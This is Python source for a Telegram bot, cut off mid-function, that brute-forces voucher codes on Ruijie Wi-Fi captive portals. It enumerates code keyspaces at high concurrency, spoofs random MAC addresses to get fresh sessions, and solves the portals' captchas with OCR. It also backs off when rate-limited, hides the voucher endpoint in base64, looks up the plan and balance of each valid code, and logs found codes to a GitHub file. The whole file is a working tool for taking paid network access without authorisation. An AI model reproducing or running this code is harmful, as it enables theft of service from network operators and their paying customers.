import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, pickle, itertools
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from collections import OrderedDict

# ⭐ Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("ruijie-bot")

# ── Environment variables ────────────────────────────────────────────────
BOT_TOKEN     = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN  = os.environ.get('GITHUB_TOKEN')
ADMIN_ID      = os.environ.get('ADMIN_ID')
REPO_OWNER    = os.environ.get('REPO_OWNER')
REPO_NAME     = os.environ.get('REPO_NAME')

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable not set")

# ── Global structures ────────────────────────────────────────────────────
TG_MAX_LEN     = 4000
SUCCESS_CODE   = asyncio.Queue()
bot            = AsyncTeleBot(BOT_TOKEN)

user_data       = {}
scan_tasks      = {}
success_texts   = {}
limited_texts   = {}
captcha_state   = {}

notify_setting  = OrderedDict()
DEFAULT_NOTIFY  = True
last_scan_params = {}
pending_brute    = {}
success_messages = {}
limited_messages = {}

session = None
_connector = None
CONCURRENCY     = 300
BATCH_SIZE      = 500
CAPTCHA_RETRY   = 5
MAX_ATTEMPTS    = 2
PROGRESS_INTERVAL = 3
GITHUB_INTERVAL   = 30
SESSION_RECHECK_INTERVAL = 600
_voucher_sem    = None
_start_time     = time.monotonic()

MAX_CHATS       = 1000
QUEUE_FILE      = "pending_queue.pkl"

# ── Portal Configuration ─────────────────────────────────────────────────
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(
            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
        ).decode(),
        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    }
}

DEFAULT_PORTAL = "portal-mm-as"


def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL


# ── ⭐ Helper functions ───────────────────────────────────────────────────
def _truncate(text, limit=TG_MAX_LEN):
    if len(text) <= limit:
        return text
    cut = text[:limit - 20].rfind("\n")
    if cut == -1:
        cut = limit - 20
    truncated = text[:cut]
    if truncated.count("`") % 2 != 0:
        truncated += "`"
    if truncated.count("*") % 2 != 0:
        truncated += "*"
    return truncated + "\n… (truncated)"


async def _safe_edit(chat_id, message_id, text, parse_mode=None):
    text = _truncate(text)
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=message_id,
            text=text, parse_mode=parse_mode
        )
        return message_id
    except Exception as e:
        try:
            sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
            return sent.message_id
        except Exception as e2:
            log.warning(f"[_safe_edit] failed for {chat_id}: {e} / {e2}")
            return message_id


def _cleanup_old_chats():
    while len(notify_setting) > MAX_CHATS:
        notify_setting.popitem(last=False)


# ── Web server (keep alive) ──────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")


async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()


# ── GitHub helpers ───────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except Exception as e:
        log.error(f"[get_file_content] error: {e}")
    return {}, None


async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return response.status, await response.text()


async def safe_update_github(path, content, message, retries=3):
    for attempt in range(retries):
        try:
            _, sha = await get_file_content(path)
            status, _ = await update_file_content(path, content, sha, message)
            if status in (200, 201):
                return True
            log.warning(f"[github] update status {status}, retry {attempt+1}")
        except Exception as e:
            log.warning(f"[github] attempt {attempt+1} failed: {e}")
        await asyncio.sleep(1 * (attempt + 1))
    return False


# ── Helper functions ─────────────────────────────────────────────────────
def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total


def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"


def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"


def _format_bytes(bytes_val):
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3:
            return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2:
            return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024:
            return f"{bytes_val/1024:.3f} KB"
        else:
            return f"{bytes_val:.0f} B"
    except:
        return str(bytes_val) # ⭐ FIX: If it's already a string like "4.000 GB", return as is


def _format_quota(used, total=None):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
            used_str = _format_bytes(total_used)
            if up and down:
                return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)"
            return used_str
        else:
            return _format_bytes(used)
    except:
        return str(used)


# ⭐ FIX: Added exact date format "September 20, 2026 at 05:39:21 PM"
def _parse_expire(expire_str):
    if not expire_str or expire_str == "N/A":
        return None
    s = str(expire_str).strip()
    formats = [
        "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d",
        "%Y/%m/%d %H:%M:%S", "%Y/%m/%d %H:%M", "%Y/%m/%d",
        "%d-%m-%Y %H:%M:%S", "%d/%m/%Y %H:%M:%S",
        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
        "%B %d, %Y at %I:%M:%S %p",  # ⭐ September 20, 2026 at 05:39:21 PM
        "%B %d, %Y at %H:%M:%S",     # ⭐ September 20, 2026 at 17:39:21
        "%b %d, %Y at %I:%M:%S %p",  # ⭐ Sep 20, 2026 at 05:39:21 PM
        "%b %d, %Y at %H:%M:%S",     # ⭐ Sep 20, 2026 at 17:39:21
    ]
    for fmt in formats:
        try:
            return datetime.strptime(s, fmt)
        except:
            continue
    return None


def is_expired(expire_str):
    dt = _parse_expire(expire_str)
    if dt is None:
        return False
    return dt < datetime.now()


async def get_balance(token, portal_config):
    url = f"{portal_config['balance_api']}/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': portal_config['domain'],
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': portal_config['referer_balance'].format(token=token),
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, cookies=cookies,
                               timeout=aiohttp.ClientTimeout(total=8)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies,
                                       timeout=aiohttp.ClientTimeout(total=8)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            try:
                data = json.loads(raw)
                # ⭐ Debug: Print raw response to log to see exact keys
                log.debug(f"[get_balance] Raw Response: {json.dumps(data)[:500]}...")
            except Exception:
                return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

            result = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])

            for d in candidates:
                if not isinstance(d, dict):
                    continue
                # ⭐ FIX: Time parsing
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_minutes(val)
                        break
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_seconds(val)
                        break
                
                # ⭐ FIX: Usage Parsing
                usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if usage:
                    result["usage"] = _format_quota(usage)
                
                # ⭐ FIX: Quota Parsing
                quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                session_quota = d.get('sessionQuota')
                total_quota = d.get('totalQuota')
                if session_quota and total_quota:
                    result["quota"] = f"{_format_bytes(session_quota)} / {_format_bytes(total_quota)}"
                elif quota:
                    result["quota"] = _format_bytes(quota)
                
                # ⭐ FIX: Plan Parsing (Added more keys)
                plan_keys = ['plan', 'planName', 'internetPlan', 'package', 'productName', 'planInfo', 'product']
                for key in plan_keys:
                    if d.get(key):
                        result["plan"] = str(d.get(key))
                        break
                
                # ⭐ FIX: Expire Parsing (Added more keys)
                expire_keys = ['expireTime', 'expiration', 'expire', 'validUntil', 'endTime', 'expire_time', 'expireDate']
                for key in expire_keys:
                    if d.get(key):
                        result["expire"] = str(d.get(key))
                        break
            
            return result
    except Exception as e:
        log.error(f"[get_balance] error for {token}: {e}")
        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}


# ⭐ FIX #2: Real brute force using itertools.product
def iter_codes(mode, length):
    chars_map = {
        1: string.digits,
        2: string.ascii_lowercase,
        3: string.ascii_uppercase,
        4: string.ascii_letters,
        5: string.ascii_lowercase + string.digits,
    }
    if mode not in chars_map:
        raise ValueError(f"Invalid mode: {mode}. Use 1-5")
    chars = chars_map[mode]
    for tup in itertools.product(chars, repeat=length):
        yield "".join(tup)


def format_progress(checked, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)


# ── Captcha handling ─────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)


def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()


async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)


def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)


async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id


async def Captcha_Image(session_obj, session_id, portal_config):
    headers = {
        'authority': portal_config['domain'],
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': portal_config['referer_index'] + session_id,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(portal_config['captcha_image_api'],
                               params=params, headers=headers) as req:
        return await req.read()


async def Varify_Captcha(session_obj, session_id, text, portal_config):
    headers = {
        'authority': portal_config['domain'],
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': portal_config['base_url'],
        'referer': portal_config['referer_index'] + session_id,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post(portal_config['captcha_verify_api'],
                                headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None


async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=10)) as response:
            return "sessionId" in str(response.url)
    except:
        return False


# ── Core voucher check ───────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None,
                        recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']

    response = None
    session_id = None

    for attempt in range(MAX_ATTEMPTS):
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(CAPTCHA_RETRY):
                try:
                    image = await Captcha_Image(task_session, session_id, portal_config)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text, portal_config):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if (not current_task or current_task.get("scan_id") != scan_id
                        or current_task.get("stop")):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": portal_config['domain'],
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": portal_config['base_url'],
                "referer": portal_config['referer_index'] + session_id,
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    json.loads(response)
            except Exception as e:
                log.debug(f"[perform_check] network error: {e}")
                continue

        if response and 'request limited' in response:
            wait = min(2 ** attempt, 6)
            log.info(f"[perform_check] rate limited, wait {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
            await asyncio.sleep(wait)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        usage_str = "N/A"
        quota_str = "N/A"
        expire_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
            balance_info = await get_balance(token, portal_config)
            if isinstance(balance_info, dict):
                plan_str   = balance_info.get("time", "N/A")
                usage_str  = balance_info.get("usage", "N/A")
                quota_str  = balance_info.get("quota", "N/A")
                expire_str = balance_info.get("expire", "N/A")
                
                # ⭐ FIX: If plan is N/A, try to get it from the logon_url or keep N/A
                if plan_str == "N/A" and balance_info.get("plan") != "N/A":
                    plan_str = balance_info.get("plan")
        except Exception as e:
            log.debug(f"[perform_check] balance parse error: {e}")

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code,
            "session_id": session_id,
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str,
            "expire": expire_str,
            "portal": portal_name
        })

        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code,
            "session_id": session_id,
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str
        })

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_lines = []
            for item in success_texts[chat_id]:
                line = f"`{item['code']}` – ⏳ {item['plan']}"
                if item.get('usage') and item['usage'] != 'N/A':
                    line += f"\n   📊 {item['usage']}"
                if item.get('quota') and item['quota'] != 'N/A':
                    line += f" | 💾 {item['quota']}"
                if item.get('portal'):
                    line += f" | 🌐 {item['portal']}"
                code_lines.append(line)
            code_text = "\n".join(code_lines)
            full = f"✅ Success Codes:\n{code_text}"

            if chat_id not in success_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full), parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] success send failed: {e}")
            else:
                success_messages[chat_id] = await _safe_edit(
                    chat_id, success_messages[chat_id], full, parse_mode="Markdown"
                )
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            full = f"⚠️ Limited Codes:\n{limited_line}"
            if chat_id not in limited_messages:
                try:
                    sent = await bot.send_message(chat_id, _truncate(full))
                    limited_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.warning(f"[notify] limited send failed: {e}")
            else:
                limited_messages[chat_id] = await _safe_edit(
                    chat_id, limited_messages[chat_id], full
                )


# ── Brute-force runner ───────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                         target=None, message=None, progress_msg=None,
                         plan_filters=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    checked = 0
    found = 0
    scan_start = time.monotonic()
    last_progress_update = 0

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            try:
                for _ in range(BATCH_SIZE):
                    batch.append(next(code_iter))
            except StopIteration:
                if not batch:
                    if progress_msg:
                        await _safe_edit(chat_id, progress_msg.message_id, "✅ Keyspace exhausted.")
                    return

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id,
                        message=message, plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

            for res in results:
                if res and not isinstance(res, Exception):
                    found += 1
                    if target and found >= target:
                        if progress_msg:
                            await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            now = time.monotonic()
            if progress_msg and now - last_progress_update >= PROGRESS_INTERVAL:
                text = format_progress(checked, speed, found, target)
                new_id = await _safe_edit(chat_id, progress_msg.message_id, text)
                if new_id != progress_msg.message_id:
                    progress_msg.message_id = new_id
                last_progress_update = now
    finally:
        scan_tasks.pop(chat_id, None)


# ── GitHub update scheduler ──────────────────────────────────────────────
def _merge_items_into_results(results, items):
    for item in items:
        cid = str(item["chat_id"])
        code = item["code"]
        if cid not in results:
            results[cid] = []
        if not any(r.get("code") == code for r in results[cid]):
            results[cid].append({
                "code": code,
                "plan": item.get("plan", "N/A"),
                "usage": item.get("usage", "N/A"),
                "quota": item.get("quota", "N/A")
            })


async def _recover_pending_queue():
    if not os.path.exists(QUEUE_FILE):
        return
    try:
        with open(QUEUE_FILE, "rb") as f:
            items = pickle.load(f)
        for item in items:
            await SUCCESS_CODE.put(item)
        log.info(f"[recover] restored {len(items)} pending items")
    except Exception as e:
        log.error(f"[recover] failed: {e}")


async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(GITHUB_INTERVAL)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue

        try:
            with open(QUEUE_FILE, "wb") as f:
                pickle.dump(items, f)
        except Exception as e:
            log.error(f"[github] disk backup failed: {e}")

        try:
            results, _ = await get_file_content("result.json")
            _merge_items_into_results(results, items)
            ok = await safe_update_github("result.json", results, "Periodic Update")
            if ok:
                if os.path.exists(QUEUE_FILE):
                    os.remove(QUEUE_FILE)
            else:
                for item in items:
                    await SUCCESS_CODE.put(item)
        except Exception as e:
            log.error(f"[github] update failed, requeueing {len(items)}: {e}")
            for item in items:
                await SUCCESS_CODE.put(item)


async def session_recheck_scheduler():
    while True:
        await asyncio.sleep(SESSION_RECHECK_INTERVAL)
        for cid, data in list(user_data.items()):
            url = data.get('session_url')
            if not url:
                continue
            try:
                ok = await check_session_url(url)
                if not ok:
                    log.warning(f"[session_recheck] session invalid for chat {cid}")
                    try:
                        await bot.send_message(
                            cid, "⚠️ သင့် Session URL သက်တမ်းကုန်သွားပါပြီ။ /setup ဖြင့် အသစ်ထည့်ပါ။"
                        )
                    except:
                        pass
                    task_data = scan_tasks.get(cid)
                    if task_data:
                        task_data["stop"] = True
                        if not task_data["task"].done():
                            task_data["task"].cancel()
            except Exception as e:
